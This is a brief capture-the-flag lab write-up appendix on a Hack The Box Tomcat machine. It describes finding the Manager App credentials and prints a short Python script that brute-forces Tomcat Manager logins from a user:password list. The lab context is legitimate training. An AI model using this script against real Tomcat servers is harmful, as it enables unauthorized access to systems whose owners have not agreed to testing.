---
description: tomcat-brute.py script
---

# Appendix A

Followed the HTB Walkthrough pdf. In attempted to bruteforce the Manager App login credentials, I had difficulties getting the python script to work. I researched another walkthrough and realized that all I needed to do was enter "10.10.10.95:8080" into the url to see the ApacheTomcat server, try the "Manager App" login, hit "Cancel" and the username and password is provided in an error screen.

vim text editor was used to create the tomcat-brute.py script:

```
└─# vim tomcat-brute.py
```

python script to check known Tomcat credentials to reveal a username and password:

```
#!/usr/bin/env python
import sys
import requests
with open('tomcat-brute.txt') as f:
    for line in f:
        c = line.strip('\n').split(":")
        r = requests.get('http://10.10.10.95:8080/manager/html', auth=(c[0], c[1]))
        
        if r.status_code == 200:
            print ("Found valid credentials \"" + line.strip('\n') + "\"")
            raise sys.exit()
```
